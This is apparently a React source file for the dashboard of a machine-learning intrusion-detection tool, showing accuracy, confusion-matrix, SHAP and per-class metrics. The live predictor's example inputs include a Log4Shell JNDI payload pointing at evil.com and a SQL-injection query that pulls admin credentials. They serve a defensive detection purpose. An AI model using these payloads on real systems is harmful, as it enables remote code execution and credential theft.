import { useEffect, useRef, useState } from "react";
import { trpc } from "@/lib/trpc";
import { Card, CardHeader, CardTitle } from "@/components/ui/Card";
import { ATTACK_COLORS } from "@/lib/utils";
import {
  BarChart, Bar, XAxis, YAxis, Tooltip, ResponsiveContainer,
  CartesianGrid, Cell, RadarChart, PolarGrid, PolarAngleAxis, Radar
} from "recharts";
import {
  Brain, Zap, Activity, Target, FlaskConical, CheckCircle2,
  AlertTriangle, TrendingUp, Info, Play, Loader2
} from "lucide-react";
import { toast } from "sonner";

const CLASS_COLORS: Record<string, string> = {
  "brute-force":          "#f97316", "ddos":                "#3b82f6",
  "malware":              "#ef4444", "normal":              "#22c55e",
  "port-scanning":        "#14b8a6", "privilege-escalation":"#10b981",
  "unauthorized-access":  "#6366f1", "vulnerability-exploit":"#e11d48",
  "sql-injection":        "#8b5cf6", "phishing":            "#ec4899",
  "data-exfiltration":    "#f59e0b",
};

const TT = {
  background: "rgba(6,9,18,0.98)",
  border: "1px solid rgba(255,255,255,0.08)",
  borderRadius: "8px",
  color: "var(--text-primary)",
  fontSize: "11px",
};

function AnimatedBar({ value, color, delay = 0 }: { value: number; color: string; delay?: number }) {
  const [width, setWidth] = useState(0);
  useEffect(() => {
    const t = setTimeout(() => setWidth(value * 100), delay);
    return () => clearTimeout(t);
  }, [value, delay]);
  return (
    <div className="h-2 rounded-full overflow-hidden" style={{ background: "rgba(255,255,255,0.05)" }}>
      <div className="h-full rounded-full" style={{ width: `${width}%`, background: color, transition: "width 700ms cubic-bezier(0.23, 1, 0.32, 1)" }} />
    </div>
  );
}

function ShapBar({ feature, importance, maxImportance, delay = 0 }: { feature: string; importance: number; maxImportance: number; delay?: number }) {
  const pct = maxImportance > 0 ? (importance / maxImportance) * 100 : 0;
  const [width, setWidth] = useState(0);
  useEffect(() => {
    const t = setTimeout(() => setWidth(pct), delay);
    return () => clearTimeout(t);
  }, [pct, delay]);
  return (
    <div className="flex items-center gap-3 py-0.5">
      <div className="text-[var(--text-tertiary)] text-[10px] font-mono w-36 truncate text-right flex-shrink-0">{feature}</div>
      <div className="flex-1 h-1.5 rounded-full overflow-hidden" style={{ background: "rgba(255,255,255,0.05)" }}>
        <div className="h-full rounded-full" style={{ width: `${width}%`, background: "linear-gradient(90deg, #3b82f6, #8b5cf6)", transition: "width 500ms cubic-bezier(0.23, 1, 0.32, 1)" }} />
      </div>
      <div className="text-[var(--text-tertiary)] text-[10px] font-mono w-14 text-right">{importance.toFixed(4)}</div>
    </div>
  );
}

function ConfusionMatrix({ matrix, labels }: { matrix: number[][]; labels: string[] }) {
  if (!matrix || !labels || matrix.length === 0) return null;
  const maxVal = Math.max(...matrix.flat());
  const short = (l: string) => l.replace("vulnerability-exploit", "vuln-exp").replace("unauthorized-access", "unauth").replace("privilege-escalation", "priv-esc").replace("port-scanning", "port-scan");

  return (
    <div className="overflow-x-auto">
      <div className="text-[var(--text-tertiary)] text-[10px] mb-3">Rows = actual · Columns = predicted</div>
      <table className="text-xs border-collapse" style={{ minWidth: `${labels.length * 56 + 80}px` }}>
        <thead>
          <tr>
            <th className="w-20 text-[var(--text-tertiary)] font-normal text-right pr-2 pb-1 text-[10px]">actual ↓</th>
            {labels.map((l) => (
              <th key={l} className="pb-1 text-center font-mono" style={{ width: 48 }}>
                <span className="text-[var(--text-tertiary)] text-[9px]" style={{ writingMode: "vertical-lr", transform: "rotate(180deg)", display: "inline-block", height: 55 }}>
                  {short(l)}
                </span>
              </th>
            ))}
          </tr>
        </thead>
        <tbody>
          {matrix.map((row, ri) => (
            <tr key={ri}>
              <td className="text-[var(--text-secondary)] text-right pr-2 whitespace-nowrap py-0.5 text-[10px]">{short(labels[ri])}</td>
              {row.map((val, ci) => {
                const isDiag    = ri === ci;
                const intensity = maxVal > 0 ? val / maxVal : 0;
                const bg        = isDiag
                  ? `rgba(34,197,94,${0.12 + intensity * 0.6})`
                  : val > 0 ? `rgba(239,68,68,${0.06 + intensity * 0.45})` : "rgba(255,255,255,0.02)";
                return (
                  <td key={ci} className="text-center py-0.5" style={{ width: 48 }}>
                    <div className="mx-0.5 rounded text-[10px] font-mono py-1" style={{ background: bg, color: val > 0 ? "#e2e8f0" : "rgba(255,255,255,0.12)" }}>
                      {val > 0 ? val : "·"}
                    </div>
                  </td>
                );
              })}
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function LivePredictor() {
  const [logText, setLogText] = useState("");
  const [result, setResult] = useState<null | {
    type: string; confidence: number; mode: string;
    alternatives: Array<{ type: string; confidence: number }>;
    explanation: Array<{ feature: string; value: number; impact: number; description: string }>;
    anomalyScore: number | null; isAnomaly: boolean;
  }>(null);

  const predict = trpc.ml.predict.useMutation({
    onSuccess: (r) => setResult(r as typeof result),
    onError: () => toast.error("Prediction failed"),
  });

  const examples = [
    "brute force: 500 failed SSH login attempts from 203.0.113.5 in 60 seconds",
    "SELECT * FROM users WHERE id=1 UNION SELECT username,password FROM admin--",
    "CVE-2021-44228 Log4Shell exploit payload detected: ${jndi:ldap://evil.com/a}",
    "Ransomware encrypting files detected: C:\\Users\\Finance\\*.xlsx modified rapidly",
    "DDoS SYN flood: 50000 packets/sec from botnet targeting web-server-01",
  ];

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-1.5">
          <FlaskConical className="w-3.5 h-3.5 text-purple-400" /> Live ML Predictor
        </CardTitle>
        <span className="text-[var(--text-tertiary)] text-[10px]">Test the model in real-time</span>
      </CardHeader>

      <div className="space-y-3">
        <textarea
          value={logText}
          onChange={(e) => setLogText(e.target.value)}
          placeholder="Enter a security log or event description…"
          className="w-full rounded-lg px-4 py-3 text-[var(--text-primary)] text-xs placeholder:text-[var(--text-tertiary)] focus:outline-none resize-none"
          style={{ background: "rgba(255,255,255,0.04)", border: "1px solid var(--border)", transition: "border-color 150ms" }}
          onFocus={(e) => e.currentTarget.style.borderColor = "rgba(37,99,235,0.4)"}
          onBlur={(e) => e.currentTarget.style.borderColor = "var(--border)"}
          rows={3}
        />

        <div className="flex flex-wrap gap-1.5">
          {examples.map((ex, i) => (
            <button key={i} onClick={() => setLogText(ex)}
              className="text-[10px] px-2.5 py-1 rounded-md truncate max-w-[200px] select-none"
              style={{ background: "rgba(255,255,255,0.04)", border: "1px solid var(--border)", color: "var(--text-tertiary)", transition: "background-color 120ms, color 120ms" }}
              onMouseEnter={(e) => { e.currentTarget.style.background = "rgba(255,255,255,0.07)"; e.currentTarget.style.color = "var(--text-secondary)"; }}
              onMouseLeave={(e) => { e.currentTarget.style.background = "rgba(255,255,255,0.04)"; e.currentTarget.style.color = "var(--text-tertiary)"; }}>
              {ex.slice(0, 35)}…
            </button>
          ))}
        </div>

        <button
          onClick={() => logText.trim() && predict.mutate({ text: logText })}
          disabled={predict.isPending || !logText.trim()}
          className="flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-medium text-white disabled:opacity-40 select-none"
          style={{ background: "#2563eb", border: "1px solid rgba(59,130,246,0.3)", transition: "background-color 150ms, transform 100ms" }}
          onMouseDown={(e) => e.currentTarget.style.transform = "scale(0.97)"}
          onMouseUp={(e) => e.currentTarget.style.transform = "scale(1)"}
          onMouseLeave={(e) => e.currentTarget.style.transform = "scale(1)"}
        >
          {predict.isPending ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
          Predict
        </button>

        {result && (
          <div className="rounded-lg p-4 space-y-3" style={{ background: "rgba(255,255,255,0.02)", border: "1px solid var(--border)" }}>
            <div className="flex items-start justify-between gap-4">
              <div>
                <div className="flex items-center gap-2">
                  <div className="w-2.5 h-2.5 rounded-full" style={{ background: CLASS_COLORS[result.type] ?? "#6b7280" }} />
                  <span className="text-[var(--text-primary)] text-sm font-semibold">{result.type}</span>
                  {result.isAnomaly && (
                    <span className="px-2 py-0.5 rounded text-[10px]" style={{ background: "rgba(239,68,68,0.15)", border: "1px solid rgba(239,68,68,0.25)", color: "#f87171" }}>
                      ANOMALY
                    </span>
                  )}
                </div>
                <div className="text-[var(--text-tertiary)] text-[10px] mt-0.5">Mode: {result.mode}</div>
              </div>
              <div className="text-right">
                <div className="text-2xl font-semibold text-green-400 tabular">{(result.confidence * 100).toFixed(1)}%</div>
                <div className="text-[var(--text-tertiary)] text-[10px]">confidence</div>
                {result.anomalyScore !== null && (
                  <div className={`text-[10px] mt-0.5 ${(result.anomalyScore ?? 0) > 0.6 ? "text-red-400" : "text-[var(--text-tertiary)]"}`}>
                    anomaly: {((result.anomalyScore ?? 0) * 100).toFixed(0)}%
                  </div>
                )}
              </div>
            </div>

            {result.alternatives.length > 0 && (
              <div>
                <div className="text-[var(--text-tertiary)] text-[10px] mb-1.5">Alternatives</div>
                <div className="flex flex-wrap gap-1.5">
                  {result.alternatives.map((a) => (
                    <span key={a.type} className="text-[10px] px-2 py-0.5 rounded"
                      style={{ background: "rgba(255,255,255,0.04)", border: "1px solid var(--border)", color: "var(--text-secondary)" }}>
                      {a.type} <span className="text-[var(--text-tertiary)]">{(a.confidence * 100).toFixed(1)}%</span>
                    </span>
                  ))}
                </div>
              </div>
            )}

            {result.explanation && result.explanation.length > 0 && (
              <div>
                <div className="text-[var(--text-tertiary)] text-[10px] mb-2 flex items-center gap-1">
                  <Info className="w-2.5 h-2.5" /> SHAP Feature Explanation
                </div>
                <div className="space-y-1.5">
                  {result.explanation.map((ex) => (
                    <div key={ex.feature} className="flex items-center gap-3 text-[10px]">
                      <span className="text-[var(--text-tertiary)] font-mono w-32 truncate text-right">{ex.feature}</span>
                      <span className="text-[var(--text-tertiary)]">= {ex.value.toFixed(2)}</span>
                      <div className={`px-1.5 py-0.5 rounded font-mono ${ex.impact > 0 ? "text-red-400" : "text-green-400"}`}
                        style={{ background: ex.impact > 0 ? "rgba(239,68,68,0.1)" : "rgba(34,197,94,0.1)" }}>
                        {ex.impact > 0 ? "+" : ""}{ex.impact.toFixed(3)}
                      </div>
                      <span className="text-[var(--text-tertiary)] flex-1 truncate">{ex.description}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </Card>
  );
}

export function MLDashboardPage() {
  const mlStats   = trpc.ml.stats.useQuery();
  const [activeTab, setActiveTab] = useState<"overview" | "matrix" | "shap" | "perclass">("overview");

  const flow = mlStats.data?.flowModel as {
    modelType?: string; accuracy?: number; f1Weighted?: number; f1Macro?: number;
    trainSamples?: number; testSamples?: number; classes?: string[];
    featureCount?: number; dataset?: string;
    perClassMetrics?: Record<string, { precision: number; recall: number; f1: number; support: number }>;
    topFeatures?: Array<{ feature: string; importance: number }>;
  } | null;

  const text = mlStats.data?.textModel as {
    accuracy?: number; cv_accuracy?: number; training_samples?: number;
    model_type?: string; features?: string;
  } | null;

  const cm   = mlStats.data?.confusionMatrix as { matrix?: number[][]; labels?: string[] } | null;
  const shap = mlStats.data?.shapData as {
    globalImportance?: Array<{ feature: string; importance: number }>;
    perClassImportance?: Record<string, Array<{ feature: string; importance: number }>>;
  } | null;

  const perClassData = flow?.perClassMetrics
    ? Object.entries(flow.perClassMetrics).map(([cls, m]) => ({
        name: cls.replace("vulnerability-exploit","vuln-exp").replace("unauthorized-access","unauth").replace("privilege-escalation","priv-esc"),
        fullName: cls,
        precision: Math.round(m.precision * 100),
        recall:    Math.round(m.recall    * 100),
        f1:        Math.round(m.f1        * 100),
        support:   m.support,
        color: CLASS_COLORS[cls] ?? "#6b7280",
      }))
    : [];

  const shapGlobal = shap?.globalImportance?.slice(0, 20) ?? [];
  const maxShap    = shapGlobal[0]?.importance ?? 1;

  const tabs = [
    { id: "overview"  as const, label: "Model Overview",    icon: Brain },
    { id: "matrix"    as const, label: "Confusion Matrix",  icon: Target },
    { id: "shap"      as const, label: "Feature Importance",icon: Activity },
    { id: "perclass"  as const, label: "Per-Class Metrics", icon: TrendingUp },
  ];

  return (
    <div className="p-6 space-y-5">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-lg font-semibold text-[var(--text-primary)] flex items-center gap-2">
            <Brain className="w-4 h-4 text-purple-400" />
            ML Model Dashboard
          </h1>
          <p className="text-[var(--text-tertiary)] text-xs mt-0.5">
            {flow?.modelType ?? "LightGBM + XGBoost + RandomForest ensemble"} · UNSW-NB15
          </p>
        </div>
        <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg"
          style={{ background: "rgba(34,197,94,0.08)", border: "1px solid rgba(34,197,94,0.18)" }}>
          <CheckCircle2 className="w-3.5 h-3.5 text-green-400" />
          <span className="text-green-400 text-xs">Models Loaded</span>
        </div>
      </div>

      {/* KPI row */}
      <div className="grid grid-cols-4 gap-3">
        {[
          { label: "Flow Accuracy",     value: flow?.accuracy   ? `${(flow.accuracy   * 100).toFixed(1)}%` : "—", color: "#3b82f6" },
          { label: "F1 Weighted",       value: flow?.f1Weighted ? `${(flow.f1Weighted * 100).toFixed(1)}%` : "—", color: "#8b5cf6" },
          { label: "Text Accuracy",     value: text?.accuracy   ? `${(text.accuracy   * 100).toFixed(1)}%` : "—", color: "#22c55e" },
          { label: "Training Samples",  value: flow?.trainSamples ? `${(flow.trainSamples / 1000).toFixed(0)}K` : "—", color: "#f97316" },
        ].map(({ label, value, color }, i) => (
          <div key={i} className="stagger-item" style={{ animationDelay: `${i * 40}ms` }}>
            <Card>
              <div className="text-[var(--text-tertiary)] text-[10px] uppercase tracking-wider mb-1">{label}</div>
              <div className="text-2xl font-semibold tabular" style={{ color }}>{value}</div>
            </Card>
          </div>
        ))}
      </div>

      {/* Architecture badges */}
      <div className="flex flex-wrap gap-1.5">
        {[
          { label: "XGBoost",          detail: "600 trees ×2",     color: "#3b82f6" },
          { label: "RandomForest",     detail: "500 trees ×3",     color: "#22c55e" },
          { label: "ExtraTrees",       detail: "500 trees ×1",     color: "#10b981" },
          { label: "Soft Voting",      detail: "2:3:1 weights",    color: "#8b5cf6" },
          { label: "LightGBM",         detail: "SHAP source",      color: "#06b6d4" },
          { label: "Isolation Forest", detail: "anomaly detector", color: "#f97316" },
          { label: "SHAP",             detail: "explanations",     color: "#ec4899" },
          { label: "UNSW-NB15",        detail: "175K flows",       color: "#14b8a6" },
          { label: flow ? `${flow.featureCount} features` : "46 features", detail: "log1p + engineered", color: "#6366f1" },
        ].map(({ label, detail, color }) => (
          <div key={label} className="px-2.5 py-1 rounded text-[10px] font-medium"
            style={{ background: `${color}12`, border: `1px solid ${color}22`, color }}>
            {label} <span style={{ opacity: 0.5 }}>· {detail}</span>
          </div>
        ))}
      </div>

      {/* Tabs */}
      <div className="flex gap-0.5 p-1 rounded-lg w-fit" style={{ background: "rgba(255,255,255,0.03)", border: "1px solid var(--border)" }}>
        {tabs.map(({ id, label, icon: Icon }) => (
          <button key={id} onClick={() => setActiveTab(id)}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs select-none"
            style={{
              background: activeTab === id ? "rgba(37,99,235,0.15)" : "transparent",
              color: activeTab === id ? "#93c5fd" : "var(--text-tertiary)",
              border: activeTab === id ? "1px solid rgba(59,130,246,0.25)" : "1px solid transparent",
              transition: "background-color 120ms, color 120ms",
            }}>
            <Icon className="w-3.5 h-3.5" />{label}
          </button>
        ))}
      </div>

      {/* Overview */}
      {activeTab === "overview" && (
        <div className="grid grid-cols-2 gap-4">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-1.5">
                <Zap className="w-3.5 h-3.5 text-blue-400" /> Network Flow Classifier
              </CardTitle>
              <span className="text-[var(--text-tertiary)] text-[10px]">Primary model</span>
            </CardHeader>
            <div className="space-y-3">
              <div className="grid grid-cols-3 gap-2">
                {[
                  ["Dataset",   flow?.dataset ?? "UNSW-NB15"],
                  ["Algorithm", "XGB+RF+ET [2:3:1]"],
                  ["Features",  `${flow?.featureCount ?? 46} network`],
                  ["Train set", `${((flow?.trainSamples ?? 0) / 1000).toFixed(0)}K samples`],
                  ["Test set",  `${((flow?.testSamples  ?? 0) / 1000).toFixed(0)}K samples`],
                  ["Classes",   `${flow?.classes?.length ?? 8} attack types`],
                ].map(([k, v]) => (
                  <div key={k} className="rounded-md p-2" style={{ background: "rgba(255,255,255,0.03)", border: "1px solid var(--border)" }}>
                    <div className="text-[var(--text-tertiary)] text-[9px] uppercase tracking-wider">{k}</div>
                    <div className="text-[var(--text-secondary)] text-[10px] font-medium mt-0.5 truncate">{v}</div>
                  </div>
                ))}
              </div>
              <div className="space-y-2">
                {[
                  { label: "Accuracy",    value: flow?.accuracy    ?? 0, color: "#3b82f6", delay: 0 },
                  { label: "F1 Weighted", value: flow?.f1Weighted  ?? 0, color: "#8b5cf6", delay: 80 },
                  { label: "F1 Macro",    value: flow?.f1Macro     ?? 0, color: "#10b981", delay: 160 },
                ].map(({ label, value, color, delay }) => (
                  <div key={label}>
                    <div className="flex justify-between text-[10px] mb-1">
                      <span className="text-[var(--text-tertiary)]">{label}</span>
                      <span className="text-[var(--text-secondary)] font-mono">{(value * 100).toFixed(1)}%</span>
                    </div>
                    <AnimatedBar value={value} color={color} delay={delay} />
                  </div>
                ))}
              </div>
              <div className="flex flex-wrap gap-1">
                {(flow?.classes ?? []).map((c) => (
                  <span key={c} className="text-[10px] px-1.5 py-0.5 rounded" style={{
                    background: `${CLASS_COLORS[c] ?? "#6b7280"}18`,
                    border: `1px solid ${CLASS_COLORS[c] ?? "#6b7280"}28`,
                    color: CLASS_COLORS[c] ?? "#9ca3af",
                  }}>{c}</span>
                ))}
              </div>
            </div>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-1.5">
                <Brain className="w-3.5 h-3.5 text-purple-400" /> Text Log Classifier
              </CardTitle>
              <span className="text-[var(--text-tertiary)] text-[10px]">Raw log fallback</span>
            </CardHeader>
            <div className="space-y-3">
              <div className="grid grid-cols-2 gap-2">
                {[
                  ["Algorithm",   "VotingClassifier"],
                  ["Sub-models",  "LinearSVC + LogReg"],
                  ["Features",    text?.features ?? "TF-IDF 12K"],
                  ["Train data",  `${text?.training_samples ?? 0} samples`],
                  ["CV Accuracy", `${((text?.cv_accuracy ?? 0) * 100).toFixed(1)}%`],
                  ["Classes",     "10 attack types"],
                ].map(([k, v]) => (
                  <div key={k} className="rounded-md p-2" style={{ background: "rgba(255,255,255,0.03)", border: "1px solid var(--border)" }}>
                    <div className="text-[var(--text-tertiary)] text-[9px] uppercase tracking-wider">{k}</div>
                    <div className="text-[var(--text-secondary)] text-[10px] font-medium mt-0.5 truncate">{v}</div>
                  </div>
                ))}
              </div>

              <div className="p-3 rounded-lg" style={{ background: "rgba(34,197,94,0.06)", border: "1px solid rgba(34,197,94,0.15)" }}>
                <div className="text-green-400 text-2xl font-semibold">
                  {text?.accuracy ? `${(text.accuracy * 100).toFixed(1)}%` : "—"}
                </div>
                <div className="text-[var(--text-tertiary)] text-[10px] mt-0.5">Test accuracy — 10-class</div>
              </div>

              <div className="p-3 rounded-lg" style={{ background: "rgba(37,99,235,0.06)", border: "1px solid rgba(37,99,235,0.15)" }}>
                <div className="text-blue-400 text-xs font-medium mb-1">Dual-mode inference</div>
                <div className="text-[var(--text-tertiary)] text-[10px]">
                  When network features are available, flow model takes priority (3:1 weight). Text model covers phishing, SQL injection, and log-only alerts.
                </div>
              </div>
            </div>
          </Card>
        </div>
      )}

      {activeTab === "matrix" && (
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-1.5">
              <Target className="w-3.5 h-3.5 text-orange-400" /> Confusion Matrix
            </CardTitle>
            <div className="flex items-center gap-3 text-[10px] text-[var(--text-tertiary)]">
              <span className="flex items-center gap-1"><span className="w-2.5 h-2.5 rounded inline-block" style={{ background: "rgba(34,197,94,0.4)" }} /> Correct</span>
              <span className="flex items-center gap-1"><span className="w-2.5 h-2.5 rounded inline-block" style={{ background: "rgba(239,68,68,0.4)" }} /> Misclassified</span>
            </div>
          </CardHeader>
          {mlStats.isLoading
            ? <div className="flex items-center justify-center h-32"><Loader2 className="w-5 h-5 animate-spin text-[var(--text-tertiary)]" /></div>
            : cm?.matrix
              ? <ConfusionMatrix matrix={cm.matrix} labels={cm.labels ?? []} />
              : <div className="text-[var(--text-tertiary)] text-xs py-8 text-center">No confusion matrix data</div>}
        </Card>
      )}

      {activeTab === "shap" && (
        <div className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-1.5">
                <Activity className="w-3.5 h-3.5 text-pink-400" /> Global Feature Importance (SHAP)
              </CardTitle>
              <div className="text-[var(--text-tertiary)] text-[10px]">Mean |SHAP| across all predictions</div>
            </CardHeader>
            {mlStats.isLoading
              ? <div className="flex items-center justify-center h-32"><Loader2 className="w-5 h-5 animate-spin text-[var(--text-tertiary)]" /></div>
              : shapGlobal.length > 0
                ? <div className="mt-2 space-y-0.5">
                    {shapGlobal.map((fi, i) => (
                      <ShapBar key={fi.feature} feature={fi.feature} importance={fi.importance} maxImportance={maxShap} delay={i * 20} />
                    ))}
                  </div>
                : <div className="text-[var(--text-tertiary)] text-xs py-8 text-center">SHAP data not available</div>}
          </Card>

          {shap?.perClassImportance && Object.keys(shap.perClassImportance).length > 0 && (
            <Card>
              <CardHeader>
                <CardTitle>Top-5 Features Per Attack Class</CardTitle>
              </CardHeader>
              <div className="grid grid-cols-2 gap-3 mt-2">
                {Object.entries(shap.perClassImportance).map(([cls, features]) => (
                  <div key={cls} className="rounded-md p-3" style={{ background: "rgba(255,255,255,0.02)", border: "1px solid var(--border)" }}>
                    <div className="flex items-center gap-2 mb-2">
                      <div className="w-2 h-2 rounded-full flex-shrink-0" style={{ background: CLASS_COLORS[cls] ?? "#6b7280" }} />
                      <span className="text-[var(--text-secondary)] text-[11px] font-medium">{cls}</span>
                    </div>
                    {features.slice(0, 5).map((f: { feature: string; importance: number }, i: number) => (
                      <div key={f.feature} className="flex items-center gap-2 text-[10px] py-0.5">
                        <span className="text-[var(--text-tertiary)] w-3 text-right">{i + 1}.</span>
                        <span className="text-[var(--text-secondary)] flex-1 truncate font-mono">{f.feature}</span>
                        <span className="text-[var(--text-tertiary)] font-mono">{f.importance.toFixed(3)}</span>
                      </div>
                    ))}
                  </div>
                ))}
              </div>
            </Card>
          )}
        </div>
      )}

      {activeTab === "perclass" && (
        <div className="space-y-4">
          {perClassData.length > 0 ? (
            <>
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-1.5">
                    <TrendingUp className="w-3.5 h-3.5 text-green-400" /> F1 Score per Class
                  </CardTitle>
                </CardHeader>
                <ResponsiveContainer width="100%" height={260}>
                  <RadarChart data={perClassData}>
                    <PolarGrid stroke="rgba(255,255,255,0.05)" />
                    <PolarAngleAxis dataKey="name" tick={{ fill: "var(--text-tertiary)", fontSize: 9 }} />
                    <Radar name="F1" dataKey="f1" stroke="#3b82f6" fill="#3b82f6" fillOpacity={0.15} strokeWidth={1.5} />
                    <Radar name="Precision" dataKey="precision" stroke="#8b5cf6" fill="#8b5cf6" fillOpacity={0.08} strokeWidth={1} />
                    <Radar name="Recall" dataKey="recall" stroke="#10b981" fill="#10b981" fillOpacity={0.08} strokeWidth={1} />
                    <Tooltip contentStyle={TT} formatter={(v: number) => `${v}%`} />
                  </RadarChart>
                </ResponsiveContainer>
              </Card>

              <Card>
                <CardHeader><CardTitle>Per-Class Metrics</CardTitle></CardHeader>
                <div className="mt-2 overflow-x-auto">
                  <table className="w-full text-[10px]">
                    <thead>
                      <tr className="text-[var(--text-tertiary)]" style={{ borderBottom: "1px solid var(--border)" }}>
                        <th className="text-left py-2 pr-4 font-medium">Class</th>
                        <th className="text-right py-2 px-3 font-medium">Precision</th>
                        <th className="text-right py-2 px-3 font-medium">Recall</th>
                        <th className="text-right py-2 px-3 font-medium">F1</th>
                        <th className="text-right py-2 pl-3 font-medium">Support</th>
                      </tr>
                    </thead>
                    <tbody>
                      {perClassData.map((d) => (
                        <tr key={d.fullName} style={{ borderBottom: "1px solid rgba(255,255,255,0.03)" }}>
                          <td className="py-1.5 pr-4">
                            <div className="flex items-center gap-2">
                              <div className="w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ background: d.color }} />
                              <span className="text-[var(--text-secondary)]">{d.fullName}</span>
                            </div>
                          </td>
                          <td className="text-right py-1.5 px-3">
                            <span className={d.precision >= 70 ? "text-green-400" : d.precision >= 40 ? "text-yellow-400" : "text-red-400"}>
                              {d.precision}%
                            </span>
                          </td>
                          <td className="text-right py-1.5 px-3">
                            <span className={d.recall >= 70 ? "text-green-400" : d.recall >= 40 ? "text-yellow-400" : "text-red-400"}>
                              {d.recall}%
                            </span>
                          </td>
                          <td className="text-right py-1.5 px-3">
                            <div className="flex items-center justify-end gap-2">
                              <div className="w-10 h-1 rounded-full overflow-hidden" style={{ background: "rgba(255,255,255,0.05)" }}>
                                <div className="h-full rounded-full bg-blue-500" style={{ width: `${d.f1}%` }} />
                              </div>
                              <span className="text-[var(--text-secondary)] font-mono">{d.f1}%</span>
                            </div>
                          </td>
                          <td className="text-right py-1.5 pl-3 text-[var(--text-tertiary)] font-mono">{d.support.toLocaleString()}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </Card>

              <Card>
                <CardHeader><CardTitle>Precision vs Recall vs F1</CardTitle></CardHeader>
                <ResponsiveContainer width="100%" height={210}>
                  <BarChart data={perClassData} margin={{ left: 0, right: 8 }}>
                    <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.04)" vertical={false} />
                    <XAxis dataKey="name" tick={{ fill: "var(--text-tertiary)", fontSize: 8 }} tickLine={false} axisLine={false} />
                    <YAxis tick={{ fill: "var(--text-tertiary)", fontSize: 9 }} tickLine={false} axisLine={false} domain={[0, 100]} unit="%" />
                    <Tooltip contentStyle={TT} formatter={(v: number) => `${v}%`} />
                    <Bar dataKey="precision" name="Precision" fill="#8b5cf6" radius={[2, 2, 0, 0]} />
                    <Bar dataKey="recall"    name="Recall"    fill="#10b981" radius={[2, 2, 0, 0]} />
                    <Bar dataKey="f1"        name="F1"        fill="#3b82f6" radius={[2, 2, 0, 0]} />
                  </BarChart>
                </ResponsiveContainer>
              </Card>
            </>
          ) : (
            <div className="text-[var(--text-tertiary)] text-xs py-8 text-center">No per-class data available</div>
          )}
        </div>
      )}

      <LivePredictor />
    </div>
  );
}
